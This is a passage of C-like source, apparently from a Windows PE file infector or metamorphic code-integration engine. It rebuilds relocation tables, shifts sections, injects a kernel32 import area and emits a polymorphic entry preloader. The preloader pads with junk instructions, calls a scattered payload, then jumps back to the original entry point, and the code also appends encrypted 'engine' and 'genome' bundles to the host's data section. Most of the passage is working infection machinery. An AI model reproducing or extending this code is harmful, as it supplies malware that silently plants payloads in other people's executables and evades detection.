    int sec_off;
    int s_rva;
    int s_vsz;
    int s_raw;
    int sec_i;

    if (pi->reloc_rva == 0) { return; }
    if (pi->reloc_sz == 0) { return; }

    reloc_raw = rva_to_raw(pi->data, pi->reloc_rva);
    if (reloc_raw < 0) { return; }

    fixed = 0;
    missed = 0;
    pos = reloc_raw;
    end = reloc_raw + pi->reloc_sz;

    while (pos + 8 <= end) {
        page_rva = read_i32(pi->data, pos);
        block_sz = read_i32(pi->data, pos + 4);
        if (block_sz < 8) { break; }

        num_entries = (block_sz - 8) / 2;
        i = 0;
        while (i < num_entries) {
            entry = mf_read_i16(pi->data, pos + 8 + i * 2);
            etype = (entry >> 12) & 0xF;
            eoff = entry & 0xFFF;

            if (etype == 3) {
                fix_rva = page_rva + eoff;

                // Only process entries OUTSIDE .text
                if (fix_rva < pi->text_rva) {
                    // Find file offset in original for this RVA
                    fix_raw = rva_to_raw(pi->data, fix_rva);
                    if (fix_raw >= 0) {
                        // In output, before .text: same position
                        old_abs = read_i32(out, fix_raw);
                        old_target_rva = old_abs - pi->image_base;
                        if (old_target_rva >= pi->text_rva && old_target_rva < pi->text_rva + pi->text_vsz) {
                            tgt_node = find_node_by_oldrva(head, old_target_rva);
                            if (tgt_node != 0) {
                                tgt_inner = old_target_rva - tgt_node->oldrva;
                                new_abs = pi->image_base + tgt_node->newrva + tgt_inner;
                                write_i32(out, fix_raw, new_abs);
                                fixed = fixed + 1;
                            } else {
                                missed = missed + 1;
                                if (missed <= 5) {
                                    print("  MISS ext-code: fix_rva=");
                                    print_hex(fix_rva);
                                    print(" target=");
                                    print_hex(old_target_rva);
                                    print("\n");
                                }
                            }
                        }
                    }
                }
                if (fix_rva >= pi->text_rva + pi->text_vsz) {
                    // After .text: file offset shifted by delta
                    fix_raw = rva_to_raw(pi->data, fix_rva);
                    if (fix_raw >= 0) {
                        fix_raw_out = fix_raw + delta;
                        old_abs = read_i32(out, fix_raw_out);
                        old_target_rva = old_abs - pi->image_base;
                        if (old_target_rva >= pi->text_rva && old_target_rva < pi->text_rva + pi->text_vsz) {
                            tgt_node = find_node_by_oldrva(head, old_target_rva);
                            if (tgt_node != 0) {
                                tgt_inner = old_target_rva - tgt_node->oldrva;
                                new_abs = pi->image_base + tgt_node->newrva + tgt_inner;
                                write_i32(out, fix_raw_out, new_abs);
                                fixed = fixed + 1;
                            } else {
                                missed = missed + 1;
                                if (missed <= 5) {
                                    print("  MISS ext-code: fix_rva=");
                                    print_hex(fix_rva);
                                    print(" target=");
                                    print_hex(old_target_rva);
                                    print(" (post-.text)\n");
                                }
                            }
                        }
                    }
                }
            }
            i = i + 1;
        }
        pos = pos + block_sz;
    }

    if (fixed > 0) {
        print("  Fixed ");
        print_int(fixed);
        print(" external code refs");
        if (missed > 0) {
            print(", ");
            print_int(missed);
            print(" missed");
        }
        print("\n");
    }
}

// Rebuild .reloc section in output buffer.
// Walks the ORIGINAL .reloc table and maps each entry to its new position
// via the chain. Non-.text entries pass through unchanged.
// Returns new .reloc section size.
int rebuild_reloc(char* out, int out_size, struct PeInfo* pi,
                  struct CodeNode* head, int delta,
                  int* extra_relocs, int extra_reloc_count,
                  int* skip_relocs, int skip_count) {
    int max_entries;
    int* entries;
    int entry_count;
    struct CodeNode* src_node;
    int src_inner;
    int new_entry_rva;
    int reloc_raw;
    int pos;
    int end;
    int page_rva;
    int block_sz;
    int num_ent;
    int i;
    int entry;
    int etype;
    int eoff;
    int target_rva;
    int tmp;
    int sorted;
    int cur_page;
    int block_start;
    int reloc_out_pos;
    int reloc_sec_off;
    int j;
    int reloc_sec_raw;
    int new_reloc_sz;
    int drop_count;
    int is_skipped;
    int k;

    if (pi->reloc_rva == 0) { return 0; }
    if (pi->reloc_sz == 0) { return 0; }

    reloc_raw = rva_to_raw(pi->data, pi->reloc_rva);
    if (reloc_raw < 0) { return 0; }

    // Allocate entry array
    max_entries = 16384;
    entries = malloc(max_entries * 4);
    entry_count = 0;

    // Walk original .reloc table
    drop_count = 0;
    pos = reloc_raw;
    end = reloc_raw + pi->reloc_sz;
    while (pos + 8 <= end) {
        page_rva = read_i32(pi->data, pos);
        block_sz = read_i32(pi->data, pos + 4);
        if (block_sz < 8) { break; }
        num_ent = (block_sz - 8) / 2;
        i = 0;
        while (i < num_ent) {
            entry = mf_read_i16(pi->data, pos + 8 + i * 2);
            etype = (entry >> 12) & 0xF;
            eoff = entry & 0xFFF;

            if (etype == 3) {
                target_rva = page_rva + eoff;

                if (target_rva >= pi->text_rva && target_rva < pi->text_rva + pi->text_vsz) {
                    // Check if this entry was skipped by fix_abs_code_refs
                    // (cross-boundary write with non-contiguous next node).
                    // Including it would corrupt instruction bytes at load time.
                    is_skipped = 0;
                    k = 0;
                    while (k < skip_count) {
                        if (skip_relocs[k] == target_rva) {
                            is_skipped = 1;
                        }
                        k = k + 1;
                    }

                    if (is_skipped != 0) {
                        drop_count = drop_count + 1;
                    } else {
                    // .text entry: map to new position via chain
                    src_node = find_node_by_oldrva(head, target_rva);
                    if (src_node != 0) {
                        src_inner = target_rva - src_node->oldrva;
                        new_entry_rva = src_node->newrva + src_inner;
                        if (entry_count < max_entries) {
                            entries[entry_count] = new_entry_rva;
                            entry_count = entry_count + 1;
                        }
                    } else {
                        drop_count = drop_count + 1;
                        if (drop_count <= 5) {
                            print("  WARN: reloc at RVA ");
                            print_hex(target_rva);
                            print(" -> no node found\n");
                        }
                    }
                    }
                } else {
                    // Non-.text entry: shift RVA for post-.text and post-.data sections
                    new_entry_rva = target_rva;
                    if (pi->va_shift > 0 && target_rva >= pi->text_rva + pi->text_vsz) {
                        new_entry_rva = target_rva + pi->va_shift;
                    }
                    if (pi->va_shift_data > 0 && pi->data_idx >= 0) {
                        int od_rva; int od_vsz;
                        od_rva = read_i32(pi->data, pi->sec_start + pi->data_idx * 40 + SEC_RVA_OFF);
                        od_vsz = read_i32(pi->data, pi->sec_start + pi->data_idx * 40 + SEC_VSIZE_OFF);
                        if (target_rva >= od_rva + od_vsz) {
                            new_entry_rva = new_entry_rva + pi->va_shift_data;
                        }
                    }
                    if (entry_count < max_entries) {
                        entries[entry_count] = new_entry_rva;
                        entry_count = entry_count + 1;
                    }
                }
            }
            i = i + 1;
        }
        pos = pos + block_sz;
    }

    // Append extra reloc entries (from IAT bootstrap)
    if (extra_relocs != 0 && extra_reloc_count > 0) {
        i = 0;
        while (i < extra_reloc_count && entry_count < max_entries) {
            entries[entry_count] = extra_relocs[i];
            entry_count = entry_count + 1;
            i = i + 1;
        }
    }

    // Sort entries by RVA (bubble sort)
    sorted = 0;
    while (sorted == 0) {
        sorted = 1;
        i = 0;
        while (i < entry_count - 1) {
            if (entries[i] > entries[i + 1]) {
                tmp = entries[i];
                entries[i] = entries[i + 1];
                entries[i + 1] = tmp;
                sorted = 0;
            }
            i = i + 1;
        }
    }

    // Find .reloc section raw offset in output (RVA shifted by va_shift + va_shift_data)
    {
        int expected_rva;
        expected_rva = pi->reloc_rva + pi->va_shift + pi->va_shift_data;
        reloc_sec_raw = 0;
        i = 0;
        while (i < pi->num_sec) {
            reloc_sec_off = pi->sec_start + i * 40;
            if (read_i32(out, reloc_sec_off + SEC_RVA_OFF) == expected_rva) {
                reloc_sec_raw = read_i32(out, reloc_sec_off + SEC_RAWPTR_OFF);
                break;
            }
            i = i + 1;
        }
    }
    if (reloc_sec_raw == 0) {
        free(entries);
        return 0;
    }

    // Clear old reloc data
    i = 0;
    while (i < pi->reloc_sz && reloc_sec_raw + i < out_size) {
        out[reloc_sec_raw + i] = 0;
        i = i + 1;
    }

    // Emit reloc blocks grouped by 4KB page
    reloc_out_pos = reloc_sec_raw;
    i = 0;
    while (i < entry_count) {
        cur_page = entries[i] & -0x1000;
        block_start = i;

        while (i < entry_count && (entries[i] & -0x1000) == cur_page) {
            i = i + 1;
        }
        num_ent = i - block_start;

        block_sz = 8 + num_ent * 2;
        if ((block_sz % 4) != 0) {
            block_sz = block_sz + 2;
        }

        write_i32(out, reloc_out_pos, cur_page);
        write_i32(out, reloc_out_pos + 4, block_sz);

        j = 0;
        while (j < num_ent) {
            eoff = entries[block_start + j] & 0xFFF;
            entry = (3 << 12) | eoff;
            write_i16(out, reloc_out_pos + 8 + j * 2, entry);
            j = j + 1;
        }

        if ((8 + num_ent * 2) % 4 != 0) {
            write_i16(out, reloc_out_pos + 8 + num_ent * 2, 0);
        }

        reloc_out_pos = reloc_out_pos + block_sz;
    }

    new_reloc_sz = reloc_out_pos - reloc_sec_raw;

    // Update .reloc section header (RVA shifted by va_shift + va_shift_data)
    i = 0;
    while (i < pi->num_sec) {
        reloc_sec_off = pi->sec_start + i * 40;
        if (read_i32(out, reloc_sec_off + SEC_RVA_OFF) == pi->reloc_rva + pi->va_shift + pi->va_shift_data) {
            write_i32(out, reloc_sec_off + SEC_VSIZE_OFF, new_reloc_sz);
            write_i32(out, reloc_sec_off + SEC_RAWSIZE_OFF,
                       align_up(new_reloc_sz, pi->file_align));
            break;
        }
        i = i + 1;
    }

    // Update DataDirectory[5] size
    write_i32(out, pi->pe_off + PE_OPT_OFF + PE_DATADIR_OFF +
              PE_RELOC_DIR_IDX * PE_DATADIR_ENTRY_SZ + 4, new_reloc_sz);

    if (drop_count > 0) {
        print("  WARN: ");
        print_int(drop_count);
        print(" .text reloc entries dropped (no matching node)\n");
    }

    free(entries);
    return new_reloc_sz;
}

// Verification pass: check all branches and references in the output buffer.
// Prints any mismatches found. Returns number of errors.
int verify_fixups(char* out, struct PeInfo* pi, struct CodeNode* head,
                  int text_raw) {
    struct CodeNode* c;
    int disp_sz;
    int write_off;
    int disp;
    int target_rva;
    int errors;
    int unlinked;
    int out_off;
    int abs_val;
    int abs_rva;

    errors = 0;
    unlinked = 0;

    c = head;
    while (c != 0) {
        // Check branches
        if ((c->flags & FL_BRANCH) != 0) {
            if (c->link != 0) {
                disp_sz = get_branch_disp_size(c->src);
                write_off = text_raw + c->newofs + c->len - disp_sz;
                if (disp_sz == 1) {
                    disp = sign_extend_8(out[write_off] & 0xFF);
                }
                if (disp_sz == 4) {
                    disp = read_i32(out, write_off);
                }
                target_rva = c->newrva + c->len + disp;
                if (target_rva != c->link->newrva + (c->target_rva - c->link->oldrva)) {
                    if (errors < 10) {
                        print("  VERIFY: branch at oldrva=");
                        print_hex(c->oldrva);
                        print(" newrva=");
                        print_hex(c->newrva);
                        print(" disp target=");
                        print_hex(target_rva);
                        print(" expected=");
                        print_hex(c->link->newrva);
                        print("\n");
                    }
                    errors = errors + 1;
                }
            } else {
                if (c->target_rva > 0 && (c->flags & FL_ME) == 0) {
                    unlinked = unlinked + 1;
                    if (unlinked <= 5) {
                        print("  VERIFY: UNLINKED branch oldrva=");
                        print_hex(c->oldrva);
                        print(" target=");
                        print_hex(c->target_rva);
                        print(" op=");
                        print_hex(c->src[0] & 0xFF);
                        print("\n");
                    }
                }
            }
        }
        c = c->next;
    }

    if (errors > 0) {
        print("  VERIFY: ");
        print_int(errors);
        print(" branch errors\n");
    }
    if (unlinked > 0) {
        print("  VERIFY: ");
        print_int(unlinked);
        print(" unlinked branches\n");
    }
    return errors + unlinked;
}

// Shift post-.text section RVAs and DataDirectory entries in the output buffer.
// Called when new .text exceeds the original VA gap.
void apply_va_shift(char* out, struct PeInfo* pi, int va_shift) {
    int i;
    int sec_off;
    int sec_rva;
    int dd_base;
    int dd_rva;
    int dd_sec_idx;
    int j;

    pi->va_shift = va_shift;

    // Shift section RVAs for all sections after .text
    i = 0;
    while (i < pi->num_sec) {
        if (i > pi->text_idx) {
            sec_off = pi->sec_start + i * 40;
            sec_rva = read_i32(out, sec_off + SEC_RVA_OFF);
            write_i32(out, sec_off + SEC_RVA_OFF, sec_rva + va_shift);
        }
        i = i + 1;
    }

    // Shift DataDirectory RVAs for entries in post-.text sections
    dd_base = pi->pe_off + PE_OPT_OFF + PE_DATADIR_OFF;
    j = 0;
    while (j < 16) {
        dd_rva = read_i32(out, dd_base + j * PE_DATADIR_ENTRY_SZ);
        if (dd_rva != 0) {
            // Determine which section this RVA belongs to (using ORIGINAL PE data)
            dd_sec_idx = find_section(pi->data, dd_rva);
            if (dd_sec_idx > pi->text_idx) {
                write_i32(out, dd_base + j * PE_DATADIR_ENTRY_SZ, dd_rva + va_shift);
            }
        }
        j = j + 1;
    }

    print("  Applied VA shift ");
    print_int(va_shift);
    print(" to ");
    print_int(pi->num_sec - pi->text_idx - 1);
    print(" sections\n");
}

// Fix absolute addresses that reference VA-shifted sections.
// Called AFTER rebuild_reloc. Walks the rebuilt reloc table and adjusts any
// absolute value whose target RVA falls in a post-.text section.
void fix_va_shifted_refs(char* out, int out_size, struct PeInfo* pi,
                         int va_shift, int old_next_sec_rva,
                         int* remapped_rvas, int remapped_count) {
    int reloc_sec_raw;
    int reloc_sec_off;
    int i;
    int pos;
    int page_rva;
    int block_sz;
    int num_ent;
    int j;
    int entry;
    int etype;
    int eoff;
    int fix_rva;
    int fix_raw;
    int abs_val;
    int target_rva;
    int fixed;
    int shifted_reloc_rva;
    int in_orig_sec;
    int k;
    int sec_rva;
    int sec_vsz;
    int is_remapped;

    // Find reloc section in output (section RVAs were shifted by text + possibly data shift)
    shifted_reloc_rva = pi->reloc_rva + va_shift;
    if (pi->va_shift_data > 0 && pi->data_idx >= 0) {
        int od_rva; int od_vsz;
        od_rva = read_i32(pi->data, pi->sec_start + pi->data_idx * 40 + SEC_RVA_OFF);
        od_vsz = read_i32(pi->data, pi->sec_start + pi->data_idx * 40 + SEC_VSIZE_OFF);
        if (pi->reloc_rva >= od_rva + od_vsz) {
            shifted_reloc_rva = shifted_reloc_rva + pi->va_shift_data;
        }
    }
    reloc_sec_raw = 0;
    i = 0;
    while (i < pi->num_sec) {
        reloc_sec_off = pi->sec_start + i * 40;
        if (read_i32(out, reloc_sec_off + SEC_RVA_OFF) == shifted_reloc_rva) {
            reloc_sec_raw = read_i32(out, reloc_sec_off + SEC_RAWPTR_OFF);
            break;
        }
        i = i + 1;
    }
    if (reloc_sec_raw == 0) { return; }

    // Walk rebuilt reloc table
    fixed = 0;
    {
    pos = reloc_sec_raw;
    while (pos + 8 < out_size) {
        page_rva = read_i32(out, pos);
        block_sz = read_i32(out, pos + 4);
        if (block_sz < 8) { break; }

        num_ent = (block_sz - 8) / 2;
        j = 0;
        while (j < num_ent) {
            entry = mf_read_i16(out, pos + 8 + j * 2);
            etype = (entry >> 12) & 0xF;
            eoff = entry & 0xFFF;

            if (etype == 3) {
                fix_rva = page_rva + eoff;
                // Find raw position of this fixup in output
                fix_raw = rva_to_raw(out, fix_rva);
                if (fix_raw >= 0 && fix_raw + 4 <= out_size) {
                    abs_val = read_i32(out, fix_raw);
                    target_rva = abs_val - pi->image_base;
                    // Check if target falls in an ORIGINAL post-.text section
                    in_orig_sec = 0;
                    if (target_rva >= old_next_sec_rva) {
                        k = 0;
                        while (k < pi->num_sec) {
                            if (k > pi->text_idx) {
                                reloc_sec_off = pi->sec_start + k * 40;
                                sec_rva = read_i32(pi->data, reloc_sec_off + SEC_RVA_OFF);
                                sec_vsz = read_i32(pi->data, reloc_sec_off + SEC_VSIZE_OFF);
                                if (target_rva >= sec_rva && target_rva < sec_rva + sec_vsz) {
                                    in_orig_sec = 1;
                                }
                            }
                            k = k + 1;
                        }
                    }
                    // Exclude entries already remapped by fix_abs_code_refs.
                    // After remapping, their new .text RVAs can overlap original
                    // post-.text section ranges; shifting them again is wrong.
                    if (in_orig_sec != 0) {
                        is_remapped = 0;
                        k = 0;
                        while (k < remapped_count) {
                            if (remapped_rvas[k] == fix_rva) {
                                is_remapped = 1;
                            }
                            k = k + 1;
                        }
                        if (is_remapped != 0) {
                            in_orig_sec = 0;
                        }
                    }
                    if (in_orig_sec != 0) {
                        // Determine total shift: post-.text gets va_shift,
                        // post-.data additionally gets va_shift_data
                        {
                            int total_shift;
                            total_shift = va_shift;
                            if (pi->data_idx >= 0 && pi->va_shift_data > 0) {
                                int orig_data_rva;
                                orig_data_rva = read_i32(pi->data, pi->sec_start + pi->data_idx * 40 + SEC_RVA_OFF);
                                if (target_rva >= orig_data_rva + read_i32(pi->data, pi->sec_start + pi->data_idx * 40 + SEC_VSIZE_OFF)) {
                                    total_shift = total_shift + pi->va_shift_data;
                                }
                            }
                            write_i32(out, fix_raw, abs_val + total_shift);
                        }
                        fixed = fixed + 1;
                    }
                }
            }
            j = j + 1;
        }
        pos = pos + block_sz;
    }

    }
}

// =============================================================================
//
// IAT Bootstrap Helpers Module
//
// Abs-mode preloader + import-area construction so the scattered payload's
// extern calls resolve through a fresh IAT in .data.
//
// =============================================================================

// Find a payload (FL_ME) CodeNode whose oldrva range covers old_off.
struct CodeNode* find_scatter_node(struct CodeNode* head, int old_off) {
    struct CodeNode* t;
    t = head;
    while (t != 0) {
        if ((t->flags & FL_ME) != 0) {
            if (old_off >= t->oldrva && old_off < t->oldrva + t->len) {
                return t;
            }
        }
        t = t->next;
    }
    return 0;
}

// Count import descriptors in the original PE import directory.
// Returns count (not including null terminator).
int count_import_descriptors(struct PeInfo* pi) {
    int raw;
    int pos;
    int count;
    int name_rva;

    if (pi->import_rva == 0) { return 0; }
    raw = rva_to_raw(pi->data, pi->import_rva);
    if (raw < 0) { return 0; }

    count = 0;
    pos = raw;
    while (pos + 20 <= pi->size) {
        name_rva = read_i32(pi->data, pos + 12);
        if (name_rva == 0) { break; }
        count = count + 1;
        pos = pos + 20;
    }
    return count;
}

// Write an IMAGE_IMPORT_BY_NAME entry. Returns bytes written (2-byte aligned).
int write_import_name(char* out, int off, char* name) {
    int len;
    int total;

    write_i16(out, off, 0);  // hint = 0
    len = str_len(name);
    mem_copy(out + off + 2, name, len + 1);  // name + null
    total = 2 + len + 1;
    if ((total % 2) != 0) {
        out[off + total] = 0;
        total = total + 1;
    }
    return total;
}

// Build import area for abs-mode (no builtins, no wrappers).
// extern_info from abs output, extern_count externs, all kernel32.dll.
// Returns total import area size.
int build_abs_import_area(char* out, int text_raw, int text_rva,
                          struct PeInfo* pi,
                          char* extern_info, int extern_count,
                          int iat_text_off) {
    int iat_size;
    int int_size;
    int names_size;
    int dll_name_size;
    int old_import_count;
    int import_dir_size;
    int iat_off;
    int int_off;
    int names_off;
    int dll_name_off;
    int import_dir_off;
    int iat_rva;
    int int_rva;
    int names_rva;
    int dll_name_rva;
    int import_dir_rva;
    int i;
    int off;
    int old_import_raw;
    char* ptr;
    int name_off;
    int entry_sz;
    int len;

    iat_size = (extern_count + 1) * 4;
    int_size = (extern_count + 1) * 4;

    // Compute names size
    names_size = 0;
    ptr = extern_info + 4;
    i = 0;
    while (i < extern_count) {
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        len = str_len(ptr);
        entry_sz = 2 + len + 1;
        if ((entry_sz % 2) != 0) { entry_sz = entry_sz + 1; }
        names_size = names_size + entry_sz;
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        i = i + 1;
    }

    dll_name_size = 14;
    old_import_count = count_import_descriptors(pi);
    import_dir_size = (old_import_count + 2) * 20;

    // Offsets in output buffer
    iat_off = text_raw + iat_text_off;
    int_off = iat_off + iat_size;
    names_off = int_off + int_size;
    dll_name_off = names_off + names_size;
    import_dir_off = dll_name_off + dll_name_size;

    // RVAs
    iat_rva = text_rva + iat_text_off;
    int_rva = iat_rva + iat_size;
    names_rva = int_rva + int_size;
    dll_name_rva = names_rva + names_size;
    import_dir_rva = dll_name_rva + dll_name_size;

    mem_set(out + iat_off, 0, iat_size);
    mem_set(out + int_off, 0, int_size);

    // Write IAT + INT entries pointing to hint/name entries
    ptr = extern_info + 4;
    name_off = 0;
    i = 0;
    while (i < extern_count) {
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        len = str_len(ptr);
        entry_sz = 2 + len + 1;
        if ((entry_sz % 2) != 0) { entry_sz = entry_sz + 1; }
        write_i32(out, iat_off + i * 4, names_rva + name_off);
        write_i32(out, int_off + i * 4, names_rva + name_off);
        name_off = name_off + entry_sz;
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        i = i + 1;
    }

    // Write name entries
    ptr = extern_info + 4;
    off = names_off;
    i = 0;
    while (i < extern_count) {
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        off = off + write_import_name(out, off, ptr);
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        i = i + 1;
    }

    // DLL name
    mem_copy(out + dll_name_off, "kernel32.dll", 13);
    out[dll_name_off + 13] = 0;

    // Import directory: copy existing + add new + null terminator
    if (old_import_count > 0 && pi->import_rva != 0) {
        old_import_raw = rva_to_raw(pi->data, pi->import_rva);
        if (old_import_raw >= 0) {
            mem_copy(out + import_dir_off, pi->data + old_import_raw,
                     old_import_count * 20);
        }
    }
    off = import_dir_off + old_import_count * 20;
    write_i32(out, off + 0, int_rva);
    write_i32(out, off + 4, 0);
    write_i32(out, off + 8, 0);
    write_i32(out, off + 12, dll_name_rva);
    write_i32(out, off + 16, iat_rva);
    mem_set(out + off + 20, 0, 20);

    // Update DataDirectory[1]
    write_i32(out, pi->pe_off + 24 + 96 + PE_IMPORT_DIR_IDX * 8,
              import_dir_rva);
    write_i32(out, pi->pe_off + 24 + 96 + PE_IMPORT_DIR_IDX * 8 + 4,
              import_dir_size);

    print("  Abs imports: ");
    print_int(extern_count);
    print(" externs, ");
    print_int(old_import_count);
    print(" existing\n");

    return import_dir_off + import_dir_size - (text_raw + iat_text_off);
}

// pick_scratch_reg lives in bundles/preloader_common.mc (included transitively
// via integrator_common.mc).

// Polymorphic abs-mode entry preloader.
// Core: save_regs → CALL main → [CALL payload] → restore_regs → JMP OEP
// scatter_rva = -1 means no payload call.
// Returns preloader size in bytes.
//
// save_regs / restore_regs replace PUSHAD/POPAD with a 3-7 reg subset
// PUSH/POP LIFO (see emit_save_regs in preloader_common.mc). entry_call /
// oep_xfer pick byte-shape variants. poly_junk fill between
// the structural ops.
int write_abs_entry_preloader(char* out, int text_raw, int text_rva,
                         int preloader_text_off, int image_base,
                         int entry_rva, int oep_rva, int scatter_rva) {
    int s;
    int off;
    int preloader_va;
    int order[7];
    int n_saved;
    int target_va;
    int oep_va;

    s = text_raw + preloader_text_off;
    off = 0;
    preloader_va = image_base + text_rva + preloader_text_off;
    target_va = image_base + entry_rva;
    oep_va = image_base + oep_rva;

    // Pre-save junk
    off = poly_junk(out + s, off, pick_scratch_reg());

    // Save regs
    off = emit_save_regs(out + s, off, order, &n_saved);

    // Post-save junk
    off = poly_junk(out + s, off, pick_scratch_reg());

    // CALL → mystiquefall main (varied: rel32 or MOV r;CALL r)
    off = emit_entry_call(out + s, off, target_va, preloader_va + off, 1);

    // Optional: CALL payload entry (same variation set)
    if (scatter_rva >= 0) {
        int payload_va;
        payload_va = image_base + scatter_rva;
        off = poly_junk(out + s, off, pick_scratch_reg());
        off = emit_entry_call(out + s, off, payload_va, preloader_va + off, 1);
    }

    // Post-CALL junk
    off = poly_junk(out + s, off, pick_scratch_reg());

    // Restore regs
    off = emit_restore_regs(out + s, off, order, n_saved);

    // Post-restore junk
    off = poly_junk(out + s, off, pick_scratch_reg());

    // OEP transfer (varied: JMP rel32 / PUSH+RET / MOV r;JMP r)
    off = emit_oep_transfer(out + s, off, oep_va, preloader_va + off, 1);

    return off;
}

// Fix old import descriptors and their INT/IAT entries for VA shift.
// After VA shift, post-.text section RVAs changed but import descriptor
// contents (OFT, Name, FT) and INT/IAT entry RVAs still have old values.
// Must be called AFTER sections are copied to output buffer.
void fix_imports_va_shift(char* out, int out_size, int va_shift,
                          int import_dir_raw, int old_import_count) {
    int i;
    int d;
    int oft_rva;
    int name_rva;
    int ft_rva;
    int raw;
    int j;
    int entry;
    int count;

    count = 0;
    i = 0;
    while (i < old_import_count) {
        d = import_dir_raw + i * 20;

        // Adjust OriginalFirstThunk
        oft_rva = read_i32(out, d);
        if (oft_rva != 0) {
            oft_rva = oft_rva + va_shift;
            write_i32(out, d, oft_rva);
        }

        // Adjust Name
        name_rva = read_i32(out, d + 12);
        if (name_rva != 0) {
            write_i32(out, d + 12, name_rva + va_shift);
        }

        // Adjust FirstThunk
        ft_rva = read_i32(out, d + 16);
        if (ft_rva != 0) {
            ft_rva = ft_rva + va_shift;
            write_i32(out, d + 16, ft_rva);
        }

        // Fix INT entries (array at adjusted OFT RVA in .rdata)
        if (oft_rva != 0) {
            raw = rva_to_raw(out, oft_rva);
            if (raw >= 0) {
                j = 0;
                while (raw + j * 4 + 4 <= out_size) {
                    entry = read_i32(out, raw + j * 4);
                    if (entry == 0) { break; }
                    // Skip ordinal imports (high bit set)
                    if ((entry & GENERIC_READ) == 0) {
                        write_i32(out, raw + j * 4, entry + va_shift);
                        count = count + 1;
                    }
                    j = j + 1;
                }
            }
        }

        // Fix IAT entries (array at adjusted FT RVA in .rdata)
        if (ft_rva != 0) {
            raw = rva_to_raw(out, ft_rva);
            if (raw >= 0) {
                j = 0;
                while (raw + j * 4 + 4 <= out_size) {
                    entry = read_i32(out, raw + j * 4);
                    if (entry == 0) { break; }
                    if ((entry & GENERIC_READ) == 0) {
                        write_i32(out, raw + j * 4, entry + va_shift);
                        count = count + 1;
                    }
                    j = j + 1;
                }
            }
        }

        i = i + 1;
    }

    print("  Fixed old imports for VA shift: ");
    print_int(old_import_count);
    print(" descriptors, ");
    print_int(count);
    print(" INT/IAT entries\n");
}

// =============================================================================
//
// Build Pipeline Module
//
// build_fixed_pe() orchestrates abs-mode PE construction:
// expands short jumps, emits the new .text from the mixed CodeNode chain,
// applies all fixups, and lays down the IAT bootstrap area
// (.data extension + BundleHeader + imports + preloader)
// before writing the output buffer.
//
// =============================================================================

// All-in-one: expand short jumps, build PE, apply all fixups, write output.
// Returns new .text size on success, 0 on failure.
int build_fixed_pe(struct PeInfo* pi, struct CodeNode* head, char** out_data, int* out_size_ptr,
                   struct AbsInfo* ai) {
    int expanded;
    int new_text_size;
    int new_text_rawsz;
    int delta;
    int out_size;
    char* out;
    int i;
    int j;
    int sec_off;
    int sec_raw;
    int sec_rawsz;
    int s_rva;
    int s_vsz;
    int text_va_limit;
    int max_va_end;
    int new_image_size;
    int reloc_sz;
    int va_shift;
    int next_sec_rva;
    int needed;
    int old_next_sec_rva;
    struct CodeNode* c;
    int chain_size;
    int vb_offset;
    int* extra_relocs;
    int extra_reloc_count;
    int mystiquefall_entry_rva;
    int oep_rva;
    int old_import_count;
    int import_dir_raw;
    struct CodeNode* entry_node;
    int lc_rva;
    int lc_raw;
    int lc_sz;
    int* skip_relocs;
    int skip_reloc_count;
    int* remapped_rvas;
    int remapped_count;
    int abs_preloader_off;
    int abs_preloader_sz;
    int abs_names_sz;
    int abs_import_sz;
    int addr;
    char* eptr;
    int data_append_sz;
    int data_new_rawsz;
    int data_delta;
    int data_ext_base;     // file offset of .data extension
    int data_ext_rva;      // RVA of .data extension start
    int abs_data_off_rva;  // RVA of payload data in .data
    int abs_bundle_off_rva;  // RVA of bundles in .data
    int abs_header_off_rva;  // RVA of BundleHeader in .data
    int abs_iat_off_rva;   // RVA of IAT in .data
    int header_n_desc;
    int header_total;
    int header_align_pad;
    int va_shift_data;
    int next_data_sec_rva;
    int data_va_limit;

    // Expand short jumps that can't reach targets
    expanded = expand_short_jumps(head, pi->text_rva);
    if (expanded > 0) {
        print("  Expanded ");
        print_int(expanded);
        print(" short jumps to near\n");
    }

    new_text_size = assign_offsets(head, pi->text_rva);
    chain_size = new_text_size;
    extra_relocs = 0;
    extra_reloc_count = 0;

    // Abs-mode: preloader in .text; data + bundle + imports in .data
    {
        // .text extension: only entry preloader after scattered code.
        //
        // Reserved size has to cover the worst-case preloader that
        // write_abs_entry_preloader emits — the actual size is computed there
        // and overwrites this placeholder, but the layout below is sized
        // off this reservation, so it must be ≥ actual.
        //
        // Worst case:
        //   - 5 poly_junk slots × up to 8 ops × 6 bytes  = 240
        //   - save/restore (3-7 PUSH/POP each)                =  14
        //   - 2 CALLs (entry + optional payload) × up to 7    =  14
        //   - JMP OEP up to 7                                 =   7
        //   = ~275 bytes worst case. Round to 384 for margin.
        abs_preloader_off = chain_size;
        abs_preloader_sz = 384;
        new_text_size = abs_preloader_off + abs_preloader_sz;

        // Compute import area size for .data extension
        abs_names_sz = 0;
        eptr = ai->extern_info + 4;
        i = 0;
        while (i < ai->extern_count) {
            while (eptr[0] != 0) { eptr = eptr + 1; }
            eptr = eptr + 1;
            j = str_len(eptr);
            j = 2 + j + 1;
            if ((j % 2) != 0) { j = j + 1; }
            abs_names_sz = abs_names_sz + j;
            while (eptr[0] != 0) { eptr = eptr + 1; }
            eptr = eptr + 1;
            i = i + 1;
        }
        old_import_count = count_import_descriptors(pi);
        abs_import_sz = (ai->extern_count + 1) * 4
                      + (ai->extern_count + 1) * 4
                      + abs_names_sz + 14
                      + (old_import_count + 2) * 20;

        // Compute BundleHeader size: 32-byte header + 16-byte descriptor each.
        // Integrators always carry ENTRY+ENGINE+GENOME (3 descriptors); +PAYLOAD
        // when pay_sz > 0. The header lands after the (encrypted) bundle_buf
        // bytes, 4-aligned, plaintext.
        header_n_desc = 3;
        if (ai->pay_sz > 0) { header_n_desc = header_n_desc + 1; }
        header_total = 32 + header_n_desc * 16;
        header_align_pad = (4 - ((ai->data_sz + ai->bundle_sz) & 3)) & 3;

        // .data extension: data + bundles + header + imports
        data_append_sz = ai->data_sz + ai->bundle_sz + header_align_pad
                       + header_total + abs_import_sz;

        extra_relocs = malloc(16384 * 4);
        extra_reloc_count = 0;

        print("  v2 abs-mode: chain=");
        print_int(chain_size);
        print(" data=");
        print_int(ai->data_sz);
        print(" bundle=");
        print_int(ai->bundle_sz);
        print(" import=");
